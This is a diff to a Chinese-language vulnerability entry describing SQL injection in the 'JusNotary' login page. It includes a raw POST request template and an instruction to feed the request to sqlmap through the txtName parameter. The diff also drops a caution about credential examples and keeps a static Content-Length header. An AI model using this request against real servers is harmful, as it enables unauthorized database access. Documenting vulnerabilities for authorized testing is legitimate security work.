@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -73,6 +73,7 @@ FOFA暂时未收录任何网站
 ```http
 POST /JusNotary/ HTTP/1.1
 Host: xxx.xxx.xxx.xxx
+Content-Length: 219
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
@@ -90,7 +91,7 @@ Connection: close
 __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+
 ```
 
-> 请求长度说明：原资料 Content-Length 为 219；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 219；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 其中注入的参数为 POST数据中的 **txtName** 参数, 保存为文件使用 Sqlmap跑一下
